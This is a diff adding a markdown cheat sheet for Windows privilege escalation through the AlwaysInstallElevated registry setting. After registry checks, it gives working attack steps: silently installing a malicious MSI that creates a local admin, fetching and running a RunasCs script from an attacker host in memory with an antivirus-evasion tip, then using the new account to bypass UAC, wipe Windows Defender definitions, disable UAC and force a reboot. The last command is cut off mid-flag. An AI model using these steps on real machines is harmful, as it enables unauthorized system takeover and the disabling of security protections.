@@ -1,0 +1,61 @@
+## **AlwaysInstallElevated**
+
+**Check if Vulnerable**
+
+If both the **HKLM** (`HKEY_LOCAL_MACHINE`) and **HKCU** (`HKEY_CURRENT_USER`) hives have the **AlwaysInstallElevated** key set to `1`, an attacker can create and execute a malicious MSI package with system-level privileges, bypassing normal user restrictions.
+
+### **How to Check for the Vulnerability**
+
+Check in HKEY_LOCAL_MACHINE for system-wide policy
+
+`reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated`
+or
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+
+### Check in HKEY_CURRENT_USER for user-specific policy
+
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+or
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+
+### **Exploit - NewLocalAdmin**
+
+**Steps**
+
+1. **Upload the `newlocaladmin.msi`** to the victim.
+2. **Execute it**
+
+```powershell
+#install
+msiexec /quiet /qn /i newlocaladmin.msi
+#uninstall
+msiexec /q /n /uninstall newlocaladmin.msi
+```
+
+1. **Upload the script `Invoke-RunasCs.ps1`** to the victim
+
+```powershell
+# Directly load it in memory
+IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/Invoke-RunasCs.ps1')
+
+# Normal download, be careful for AV Detection, consider placing it in the /Temp or /Tasks folders
+iwr -uri http://[ATTACKER_IP]/Invoke-RunasCs.ps1 -Outfile Invoke-RunasCs.ps1
+Import-Module ./Invoke-RunasCs.ps1
+```
+
+1. **Get Code Execution** with the newly created user
+
+```powershell
+Invoke-RunasCs amit 'Password123!' 'whoami /priv' -ForceProfile -CreateProcessFunction 2 -BypassUac
+
+```
+
+Disabling UAC with new user.
+
+```powershell
+Invoke-RunasCs amit 'Password123!' "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -removedefinitions -all" -ForceProfile -CreateProcessFunction 2 -BypassUac
+
+Invoke-RunasCs amit 'Password123!' 'reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f' -ForceProfile -CreateProcessFunction 2 -BypassUac
+
+Invoke-RunasCs amit 'Password123!' 'shutdown -r -t 0' -ForceProfile -CreateProcessFunction 2 -BypassUa
+```
